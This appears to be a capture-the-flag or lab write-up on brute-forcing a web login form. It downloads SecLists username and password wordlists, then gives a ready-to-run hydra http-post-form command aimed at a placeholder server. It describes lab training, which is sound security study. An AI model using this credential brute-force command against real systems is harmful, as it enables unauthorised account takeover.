# Login Forms

After successfully brute-forcing, and then logging into the target, what is the full flag you find?

Getting the flag:

**Step 1** - Download the username and password wordlist:

* {% code overflow="wrap" %}
  ```bash
  curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
  ```
  {% endcode %}
* {% code overflow="wrap" %}
  ```bash
  curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
  ```
  {% endcode %}

**Step 2** - Execute the command:

* {% code overflow="wrap" %}
  ```bash
  hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f SERVER_IP -s SERVER_PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
  ```
  {% endcode %}

Step 3:

*   Login with the founded credentials.\


    <figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

    <figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

